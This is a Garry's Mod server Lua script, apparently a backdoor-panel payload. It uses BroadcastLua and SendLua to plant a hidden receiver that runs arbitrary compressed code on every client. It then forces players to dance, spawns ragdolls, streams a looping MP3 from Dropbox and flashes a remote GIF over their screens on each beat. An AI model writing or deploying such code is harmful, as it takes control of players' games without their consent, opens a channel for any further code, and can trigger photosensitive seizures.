-- by IXXE
-- Read LICENSE before making changes

function RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end
    return ret
end

m_strImageGlobalVar = RandomString( 6, 12 )

local net_string = RandomString(24, 25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(code)
    timer.Simple(1, function()
        local data = util.Compress(code)
        local len = #data
        net.Start(net_string)
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        net.Broadcast()
    end)
end

hook.Add("Think","\xFF\xFF\xFF",function()
	local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
	for _, v in ipairs(player.GetAll()) do
		v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
	end
end)

SendToClient([=[
        g_]=].. m_strImageGlobalVar.. [=[ = {}
        local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
        local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
            local pnl = vgui.Create( "HTML" )
            pnl:SetPos( ScrW() -1, ScrH() -1 )
            pnl:SetVisible( true )
            pnl:SetMouseInputEnabled( false )
            pnl:SetKeyBoardInputEnabled( false )
            pnl:SetSize( intSizeX, intSizeY )
            pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )

            local PageLoaded
            PageLoaded = function()
                local mat = pnl:GetHTMLMaterial()
                if mat then
                    g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
                    return
                end

                timer.Simple( 0.5, PageLoaded )
            end

            PageLoaded()
        end
    LoadWebMaterial( "https://i.imgur.com/3TUuahR.gif", "hud2", 256 , 256 )
]=])

SendToClient([=[
timer.Simple(5, function()
    timer.Create("semmmmm", 5, 100, function()
		RunConsoleCommand("act","dance")
		RunConsoleCommand("_darkrp_doanimation", "1642")
	end)

	local ragtbl = {}
	for i=1,20 do
		ragtbl[i] = ClientsideRagdoll( "models/player/gman_high.mdl" )
		ragtbl[i]:SetNoDraw( false )
		ragtbl[i]:DrawShadow( true )
	end

    local function GetWebMat( strURL )
        return g_]=].. m_strImageGlobalVar.. [=[[strURL]
    end
    local uwu = {}

    hook.Add("HUDPaint", "okay",function()
        for k,v in pairs(uwu) do
            v()
        end
    end)

    SOUNDSTART_CTP = false
    OZJFOZJCEZIO = true


    sound.PlayURL("https://www.dropbox.com/s/m6ky9mbi2u366au/o.mp3?dl=1","mono noblock noplay",function(s)
        if not s then return end
        if SOUNDSTART_CTP then s:Stop() return end
        SOUNDSTART_CTP = true
        s:SetVolume(1)
        s:Play()
        s:EnableLooping(true)
        local ragtbl = {}
        uwu["CoolEffect"] = function()
            local tbl = {}
            s:FFT(tbl,FFT_2048)
            xpcall(function()
                local fal = 0
            for i=4,6 do
                fal = fal + tbl[i]
            end
            if fal > 0.8 then
                local oneid = "newhud"..math.random(100, 300).."id"
                hook.Add( "HUDPaint", oneid, function()
                    surface.SetDrawColor( 255, 255, 255, 255 )
                    if GetWebMat( "hud2" ) then -- lui
                        surface.SetMaterial( GetWebMat("hud2")[1] )
                        surface.DrawTexturedRect( 0, 0, ScrW(), ScrH() )
                    end
                end )
                timer.Simple(0.2, function()
                    hook.Remove( "HUDPaint", oneid)
                end)
            end
            end,function()
            end)
        end
    end)
end)
]=])
